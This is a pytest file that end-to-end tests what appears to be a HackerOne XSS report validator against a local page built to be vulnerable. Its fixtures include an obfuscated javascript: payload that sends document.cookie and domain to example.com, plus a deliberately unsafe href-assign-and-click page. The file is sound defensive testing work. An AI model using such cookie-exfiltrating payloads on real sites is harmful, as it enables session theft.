"""
End-to-end flow test for the H1 XSS validator.

This is the test that the three separate unit fixes each missed, because each
covered one stage in isolation while the bugs lived in the seams between stages:

  report text -> parse_report -> proof_url extraction -> browser drive -> verdict

Here we run the WHOLE pipeline from the raw report text a reporter would paste,
against a local HTTP server that reproduces the vulnerable page's behaviour
(``<a href=url>`` set from a query param, then clicked). We stub only the true
external boundaries:

  - the two LLM calls (parser enrichment + validator advisory) -> no-op, so the
    test is deterministic and needs no AWS credentials;
  - ``_is_safe_url`` -> allow, so the validator will drive the local (private-IP)
    test server it otherwise refuses for safety.

Everything between those boundaries — URL extraction, payload preservation,
browser navigation, redirect observation, verdict — runs for real. A regression
in any of them (e.g. the parser truncating the payload at a single quote, or the
validator not clicking the interaction sink) turns this test red.

Skips cleanly when Playwright chromium is not installed.
"""

from __future__ import annotations

import http.server
import socketserver
import threading

import pytest

import dast.hackerone.parser as parser_mod
import dast.hackerone.validator as validator_mod
from dast.hackerone.parser import parse_report


def _chromium_available() -> bool:
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            b = p.chromium.launch(headless=True)
            b.close()
        return True
    except Exception:
        return False


_CHROMIUM = _chromium_available()
pytestmark = pytest.mark.skipif(not _CHROMIUM, reason="chromium not installed")


# The vulnerable page, faithful to the reported DownloadPage.html: it reads the
# `url` query param, assigns it to an anchor's href, and clicks it — so a
# javascript: payload in `url` becomes a redirect on click.
_VULN_PAGE = (
    b"<html><body>\n"
    b"<a id='dl'>Download</a>\n"
    b"<script>\n"
    b"  var u = new URLSearchParams(location.search).get('url');\n"
    b"  var link = document.getElementById('dl');\n"
    b"  link.href = u;\n"
    b"  link.click();\n"
    b"</script>\n"
    b"</body></html>"
)

# A safe page: it reflects the url param into visible text but never assigns it
# to an href or executes it. This must NOT be confirmed.
_SAFE_PAGE = (
    b"<html><body>\n"
    b"<div id='out'></div>\n"
    b"<script>\n"
    b"  var u = new URLSearchParams(location.search).get('url');\n"
    b"  document.getElementById('out').textContent = u;\n"
    b"</script>\n"
    b"</body></html>"
)


class _TargetServer:
    """Serves a fixed page on a random loopback port for the test duration."""

    def __init__(self, body: bytes):
        class _H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):  # silence access logs
                pass

        self._srv = socketserver.TCPServer(("127.0.0.1", 0), _H)
        self.port = self._srv.server_address[1]
        self._thread = threading.Thread(target=self._srv.serve_forever, daemon=True)

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, *exc):
        self._srv.shutdown()
        self._srv.server_close()


@pytest.fixture(autouse=True)
def _stub_external_boundaries(monkeypatch):
    """Stub the only true externals: the two LLM calls and the URL safety gate."""
    # Parser LLM enrichment -> no-op (keep the deterministic regex extraction).
    monkeypatch.setattr(parser_mod, "_llm_enrich", lambda report, text: None)

    # Validator advisory LLM -> deterministic canned reply.
    async def _fake_llm_analyse(report, body, status_code):
        return "Verdict: Needs manual review\nConfidence: 50%\nReasoning: stubbed in test"
    monkeypatch.setattr(validator_mod, "_llm_analyse_response", _fake_llm_analyse)

    # Allow the local (private-IP) test server the validator would otherwise
    # refuse. This is a boundary stub, not a logic change.
    monkeypatch.setattr(validator_mod, "_is_safe_url", lambda url: True)


def _report_text(port: int) -> str:
    """
    The raw report a reporter pastes — faithful to the real one: the javascript:
    payload lives in the proof URL's query string, and the string-concatenation
    plus signs are percent-encoded as %2b (otherwise a browser decodes '+' to a
    space and breaks the JS — exactly what happens with the real payload).
    """
    proof = (
        f"http://127.0.0.1:{port}/?url=javascript:top['loca'%2b'tion']="
        "'https://example.com/?c='%2btop['docu'%2b'ment']['cookie']"
        "%2btop['docu'%2b'ment']['domain']&filename=x"
    )
    return (
        "I just found a Cross Site Scripting issue at your site\n\n"
        f"{proof}\n\n"
        "Payload: victim clicks the link in his browser, the javascript executes\n"
    )


async def test_redirect_xss_confirmed_end_to_end():
    """Full pipeline: raw report -> parse -> browser -> CONFIRMED on observed redirect."""
    with _TargetServer(_VULN_PAGE) as server:
        report = parse_report(_report_text(server.port))

        # Guard the seam that broke before: the parser must keep the whole
        # payload in the proof URL (not truncate at the first single quote).
        assert "cookie" in report.proof_url, "parser truncated the payload"
        assert report.vuln_type == "xss"

        result = await validator_mod._validate_xss(
            report, proxy_port=None, screenshot=False,
        )

    assert result.status == "confirmed", f"expected confirmed, got {result.status}: {result.evidence}"
    # Evidence is the structured, H1-paste-ready block: it names the exfil host,
    # the origin->destination flow, a risk line, and reproduction steps.
    assert "example.com" in result.evidence
    assert "->" in result.evidence and "Flow" in result.evidence
    assert "Risk" in result.evidence and "Reproduction" in result.evidence
    assert "interaction" in result.checks_run or "playwright_load" in result.checks_run


async def test_non_vulnerable_page_not_confirmed():
    """A page that only reflects (never executes) must not be confirmed."""
    with _TargetServer(_SAFE_PAGE) as server:
        report = parse_report(_report_text(server.port))
        result = await validator_mod._validate_xss(
            report, proxy_port=None, screenshot=False,
        )

    # No dialog, no off-origin redirect -> must fall to manual, never confirmed.
    assert result.status != "confirmed", f"false positive: {result.evidence}"
    assert result.status in ("needs_manual", "not_confirmed")
    # The inconclusive evidence must guide the triager: why + how to test manually.
    assert "manual" in result.evidence.lower()
    assert "How to test manually" in result.evidence
    assert "Suggested payloads" in result.evidence


async def test_llm_url_repair_recovers_broken_payload(monkeypatch):
    """
    When the payload is mangled beyond the deterministic repair (here: the '+'
    are stripped entirely, so the JS is broken) and the browser observes no
    execution, the LLM repair proposes a corrected URL, the browser retries and
    THEN observes the redirect -> confirmed. The LLM only fixed the input; the
    browser still made the call.
    """
    with _TargetServer(_VULN_PAGE) as server:
        # Broken URL: concatenation '+' removed, so 'loca''tion' is invalid JS.
        broken = (
            f"http://127.0.0.1:{server.port}/?url=javascript:top['loca''tion']="
            "'https://example.com/?c='top['docu''ment']['cookie']"
        )
        # The LLM "repairs" it into a working, correctly-encoded URL (same host).
        fixed = (
            f"http://127.0.0.1:{server.port}/?url=javascript:top['loca'%2b'tion']="
            "'https://example.com/?c='%2btop['docu'%2b'ment']['cookie']"
        )

        async def _fake_repair(report, proof_url, page_content):
            return fixed
        monkeypatch.setattr(validator_mod, "_llm_repair_proof_url", _fake_repair)

        report = parse_report(
            "I just found a Cross Site Scripting issue\n\n" + broken + "\n\nPayload: click\n"
        )
        result = await validator_mod._validate_xss(
            report, proxy_port=None, screenshot=False,
        )

    assert result.status == "confirmed", f"expected confirmed after repair: {result.evidence}"
    assert "llm_url_repair" in result.checks_run
